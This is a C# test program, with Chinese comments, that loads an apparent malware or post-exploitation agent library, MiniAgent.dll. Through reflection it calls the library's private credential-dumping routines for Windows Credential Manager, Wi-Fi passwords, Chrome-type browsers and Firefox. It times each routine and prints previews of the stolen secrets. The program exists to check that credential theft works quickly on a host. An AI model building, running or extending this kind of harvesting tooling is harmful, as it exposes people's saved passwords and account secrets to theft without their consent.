using System;
using System.Diagnostics;
using System.Reflection;
using System.Text;

class TestCredTiming
{
    static void Main()
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("=== 凭证提取模块计时测试 ===\n");

        var asm = Assembly.LoadFrom("MiniAgent.dll");
        var agentType = asm.GetType("MiniAgent.Agent");

        // 跳过构造函数创建实例
        var agent = System.Runtime.Serialization.FormatterServices.GetUninitializedObject(agentType);

        string[] methods = {
            "DumpCredentialManager",
            "DumpWiFiPasswords",
            "DumpBrowserCreds",
            "DumpFirefoxPasswords"
        };

        foreach (var m in methods)
        {
            var method = agentType.GetMethod(m, BindingFlags.NonPublic | BindingFlags.Instance);
            if (method == null)
            {
                Console.WriteLine("[{0}] 方法未找到!", m);
                continue;
            }

            var sb = new StringBuilder();
            var sw = Stopwatch.StartNew();
            Console.Write("[{0}] 开始... ", m);
            try
            {
                method.Invoke(agent, new object[] { sb, true });
                sw.Stop();
                Console.WriteLine("{0}ms, 输出={1}字符", sw.ElapsedMilliseconds, sb.Length);
                if (sb.Length > 0)
                {
                    string preview = sb.ToString();
                    if (preview.Length > 300) preview = preview.Substring(0, 300) + "...";
                    Console.WriteLine("  预览: " + preview);
                }
            }
            catch (Exception ex)
            {
                sw.Stop();
                var inner = ex.InnerException ?? ex;
                Console.WriteLine("异常! {0}ms: {1}: {2}", sw.ElapsedMilliseconds, inner.GetType().Name, inner.Message);
            }
            Console.WriteLine();
        }

        Console.WriteLine("=== 测试完毕 ===");
    }
}
